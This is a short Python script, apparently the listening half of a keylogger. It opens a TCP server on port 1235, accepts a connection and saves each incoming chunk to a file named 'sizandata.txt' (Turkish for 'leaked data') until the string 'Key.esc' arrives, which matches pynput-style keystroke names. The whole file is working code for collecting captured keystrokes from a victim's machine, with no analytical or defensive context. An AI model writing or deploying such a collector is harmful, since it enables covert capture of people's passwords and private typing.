import socket

f = open("sizandata.txt",'w')
server_ip = '0.0.0.0'
server_port = 1235


server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind((server_ip, server_port))
server_socket.listen(1)
print("Dinleniyor...")
client_socket, client_address = server_socket.accept()
print(f"{client_address} adresinden bağlantı kabul edildi.")
while True:
        gelen_veri = client_socket.recv(1024).decode()
        print("Alınan veri:", gelen_veri)
        f.write(gelen_veri+"\n")
        if "Key.esc" in gelen_veri:
                client_socket.close()
                server_socket.close()
                f.close()
                break

